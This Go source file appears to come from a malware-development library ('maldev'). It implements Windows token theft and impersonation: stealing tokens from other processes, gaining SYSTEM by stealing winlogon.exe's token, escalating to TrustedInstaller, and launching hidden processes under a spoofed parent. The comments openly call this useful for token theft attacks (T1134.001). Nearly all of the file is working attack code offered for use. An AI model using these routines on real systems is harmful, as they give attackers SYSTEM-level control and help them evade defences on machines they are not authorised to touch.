//go:build windows

// Package impersonate provides Windows thread impersonation utilities.
package impersonate

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sync/errgroup"
	"golang.org/x/sys/windows"

	"github.com/oioio-space/maldev/process/enum"
	"github.com/oioio-space/maldev/win/api"
	"github.com/oioio-space/maldev/win/token"
)

const (
	scManagerConnect    = 0x0001
	serviceQueryStatus  = 0x0004
	serviceStart        = 0x0010
	serviceStartPending = 0x00000002
	serviceRunning      = 0x00000004
	scStatusProcessInfo = 0
)

type serviceStatusProcess struct {
	ServiceType             uint32
	CurrentState            uint32
	ControlsAccepted        uint32
	Win32ExitCode           uint32
	ServiceSpecificExitCode uint32
	CheckPoint              uint32
	WaitHint                uint32
	ProcessID               uint32
	ServiceFlags            uint32
}

// LogonType represents the type of logon operation.
type LogonType uint32

const (
	LOGON32_LOGON_INTERACTIVE    LogonType = 2
	LOGON32_LOGON_NETWORK        LogonType = 3
	LOGON32_LOGON_BATCH          LogonType = 4
	LOGON32_LOGON_SERVICE        LogonType = 5
	LOGON32_LOGON_NEW_CREDENTIALS LogonType = 9
)

// LogonProvider specifies the logon provider.
type LogonProvider uint32

const (
	LOGON32_PROVIDER_DEFAULT LogonProvider = 0
)

// LogonUserW wraps the advapi32 LogonUserW function and returns the resulting
// Windows token.
func LogonUserW(username, domain, password string, logonType LogonType, logonProvider LogonProvider) (windows.Token, error) {
	u, _ := windows.UTF16PtrFromString(username)
	d, _ := windows.UTF16PtrFromString(domain)
	p, _ := windows.UTF16PtrFromString(password)

	var handle uintptr
	ret, _, e := api.ProcLogonUserW.Call(
		uintptr(unsafe.Pointer(u)),
		uintptr(unsafe.Pointer(d)),
		uintptr(unsafe.Pointer(p)),
		uintptr(logonType),
		uintptr(logonProvider),
		uintptr(unsafe.Pointer(&handle)),
	)
	if int(ret) == 0 {
		return windows.Token(windows.InvalidHandle), os.NewSyscallError("LogonUserW", e)
	}
	return windows.Token(handle), nil
}

// ImpersonateLoggedOnUser wraps the advapi32 ImpersonateLoggedOnUser function.
func ImpersonateLoggedOnUser(t windows.Token) error {
	ret, _, e := api.ProcImpersonateLoggedOnUser.Call(uintptr(t))
	if int(ret) == 0 {
		return os.NewSyscallError("ImpersonateLoggedOnUser", e)
	}
	return nil
}

// ThreadEffectiveTokenOwner returns the user and domain of the effective token
// on the current thread. Requires administrator privileges. The returned
// strings are localized (e.g. "Système"/"AUTORITE NT" on fr-FR) — for
// tests or comparisons that must stay locale-independent, use
// ThreadEffectiveTokenSID instead.
func ThreadEffectiveTokenOwner() (user string, domain string, err error) {
	t := windows.GetCurrentThreadEffectiveToken()
	tokenUser, err := t.GetTokenUser()
	if err != nil {
		return "", "", err
	}

	user, domain, _, err = tokenUser.User.Sid.LookupAccount("")
	if err != nil {
		return "", "", err
	}

	return user, domain, nil
}

// ThreadEffectiveTokenSID returns the string representation of the user SID
// on the current thread's effective token (e.g. "S-1-5-18" for SYSTEM).
// Locale-independent; prefer this over ThreadEffectiveTokenOwner when
// identifying well-known principals.
func ThreadEffectiveTokenSID() (string, error) {
	t := windows.GetCurrentThreadEffectiveToken()
	tokenUser, err := t.GetTokenUser()
	if err != nil {
		return "", err
	}
	return tokenUser.User.Sid.String(), nil
}

// ThreadEffectiveTokenHasGroup reports whether the current thread's effective
// token includes the given SID in its group list. Needed to distinguish
// service-impersonation contexts where TokenUser remains NT AUTHORITY\SYSTEM
// (S-1-5-18) but the token has picked up an additional service SID in its
// Groups — e.g. TrustedInstaller (S-1-5-80-...) after ImpersonateByPID on
// the TrustedInstaller service process.
func ThreadEffectiveTokenHasGroup(sid string) (bool, error) {
	target, err := windows.StringToSid(sid)
	if err != nil {
		return false, fmt.Errorf("parse sid %q: %w", sid, err)
	}
	// No LocalFree here: golang.org/x/sys/windows StringToSid wraps the
	// SID in a Go-owned allocation with a finalizer, and explicit
	// LocalFree has been observed to crash the test binary on some
	// Win10/11 builds (likely double-free). The tiny leak is harmless for
	// a short-lived process.

	t := windows.GetCurrentThreadEffectiveToken()
	groups, err := t.GetTokenGroups()
	if err != nil {
		return false, err
	}
	for _, g := range groups.AllGroups() {
		if windows.EqualSid(g.Sid, target) {
			return true, nil
		}
	}
	return false, nil
}

// runImpersonated executes fn on a locked OS thread impersonated as the given
// Windows token. The thread reverts to self after fn returns.
func runImpersonated(t windows.Token, fn func() error) error {
	group := new(errgroup.Group)
	group.Go(func() error {
		runtime.LockOSThread()
		defer runtime.UnlockOSThread()

		if err := ImpersonateLoggedOnUser(t); err != nil {
			return err
		}
		defer windows.RevertToSelf()

		return fn()
	})
	return group.Wait()
}

// ImpersonateToken runs callbackFunc on a locked OS thread under the identity
// of the given token (typically obtained via token.Steal or token.Interactive).
// The thread reverts to self after callbackFunc returns.
//
// Unlike ImpersonateThread which requires credentials, this accepts a stolen
// or duplicated token handle — useful for token theft attacks (T1134.001).
func ImpersonateToken(tok *token.Token, callbackFunc func() error) error {
	return runImpersonated(tok.Token(), callbackFunc)
}

// ImpersonateThread runs callbackFunc on a locked OS thread under the
// credentials of the provided user. The thread reverts to self after
// callbackFunc returns.
func ImpersonateThread(isInDomain bool, domain, username, password string, callbackFunc func() error) error {
	logonType := LOGON32_LOGON_INTERACTIVE
	if !isInDomain {
		domain = "."
	}

	t, err := LogonUserW(username, domain, password, logonType, LOGON32_PROVIDER_DEFAULT)
	if err != nil {
		return err
	}

	wt := token.New(t, token.Impersonation)
	defer wt.Close()

	if err = wt.EnableAllPrivileges(); err != nil {
		return err
	}

	return runImpersonated(wt.Token(), callbackFunc)
}

// RunAsTrustedInstaller spawns cmd with args as a child of the TrustedInstaller
// service process (NT SERVICE\TrustedInstaller), giving it TI-level privileges.
// Requires admin + SeDebugPrivilege.
//
// The returned *exec.Cmd has already been started. The caller is responsible
// for calling cmd.Wait().
func RunAsTrustedInstaller(cmd string, args ...string) (*exec.Cmd, error) {
	tiPID, err := startAndFindTI()
	if err != nil {
		return nil, err
	}

	parentHandle, err := windows.OpenProcess(windows.PROCESS_CREATE_PROCESS, false, tiPID)
	if err != nil {
		return nil, fmt.Errorf("open TrustedInstaller process: %w", err)
	}
	defer windows.CloseHandle(parentHandle)

	c := exec.Command(cmd, args...)
	c.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		ParentProcess: syscall.Handle(parentHandle),
	}

	if err := c.Start(); err != nil {
		return nil, fmt.Errorf("start command: %w", err)
	}
	return c, nil
}

// ImpersonateByPID impersonates the given process and runs fn under its
// identity. The thread reverts to self after fn returns.
// Requires SeDebugPrivilege for cross-session processes.
func ImpersonateByPID(pid uint32, fn func() error) error {
	tok, err := token.Steal(int(pid))
	if err != nil {
		return fmt.Errorf("steal token from PID %d: %w", pid, err)
	}
	defer tok.Close()

	return runImpersonated(tok.Token(), fn)
}

// GetSystem runs fn under NT AUTHORITY\SYSTEM context by stealing the
// winlogon.exe token. Requires admin + SeDebugPrivilege.
func GetSystem(fn func() error) error {
	pid, err := findProcessByName("winlogon.exe")
	if err != nil {
		return fmt.Errorf("find winlogon: %w", err)
	}
	return ImpersonateByPID(pid, fn)
}

// GetTrustedInstaller runs fn under NT SERVICE\TrustedInstaller context.
// First elevates to SYSTEM (required to open the TI process), starts the
// TrustedInstaller service, then impersonates its token.
// Requires admin + SeDebugPrivilege.
func GetTrustedInstaller(fn func() error) error {
	return GetSystem(func() error {
		tiPID, err := startAndFindTI()
		if err != nil {
			return fmt.Errorf("start TrustedInstaller: %w", err)
		}
		return ImpersonateByPID(tiPID, fn)
	})
}

func findProcessByName(name string) (uint32, error) {
	procs, err := enum.FindByName(name)
	if err != nil {
		return 0, err
	}
	if len(procs) == 0 {
		return 0, fmt.Errorf("process %q not found", name)
	}
	return procs[0].PID, nil
}

// startAndFindTI ensures the TrustedInstaller service is running and returns its PID.
func startAndFindTI() (uint32, error) {
	scName, _ := windows.UTF16PtrFromString("TrustedInstaller")
	emptyStr, _ := windows.UTF16PtrFromString("")

	hSCM, _, err := api.ProcOpenSCManagerW.Call(
		uintptr(unsafe.Pointer(emptyStr)),
		0,
		uintptr(scManagerConnect),
	)
	if hSCM == 0 {
		return 0, fmt.Errorf("OpenSCManager: %w", err)
	}
	defer api.ProcCloseServiceHandle.Call(hSCM) //nolint:errcheck

	hSvc, _, err := api.ProcOpenServiceW.Call(
		hSCM,
		uintptr(unsafe.Pointer(scName)),
		uintptr(serviceQueryStatus|serviceStart),
	)
	if hSvc == 0 {
		return 0, fmt.Errorf("OpenService(TrustedInstaller): %w", err)
	}
	defer api.ProcCloseServiceHandle.Call(hSvc) //nolint:errcheck

	api.ProcStartServiceW.Call(hSvc, 0, 0) //nolint:errcheck

	// Poll until SERVICE_RUNNING — StartServiceW is async.
	var ssp serviceStatusProcess
	needed := uint32(unsafe.Sizeof(ssp))
	for i := 0; i < 20; i++ {
		r, _, err := api.ProcQueryServiceStatusEx.Call(
			hSvc,
			uintptr(scStatusProcessInfo),
			uintptr(unsafe.Pointer(&ssp)),
			uintptr(needed),
			uintptr(unsafe.Pointer(&needed)),
		)
		if r == 0 {
			return 0, fmt.Errorf("QueryServiceStatusEx: %w", err)
		}
		if ssp.CurrentState == serviceRunning {
			return ssp.ProcessID, nil
		}
		if ssp.CurrentState != serviceStartPending {
			return 0, fmt.Errorf("TrustedInstaller service in unexpected state %d", ssp.CurrentState)
		}
		time.Sleep(500 * time.Millisecond)
	}
	return 0, fmt.Errorf("TrustedInstaller service did not start within 10s")
}
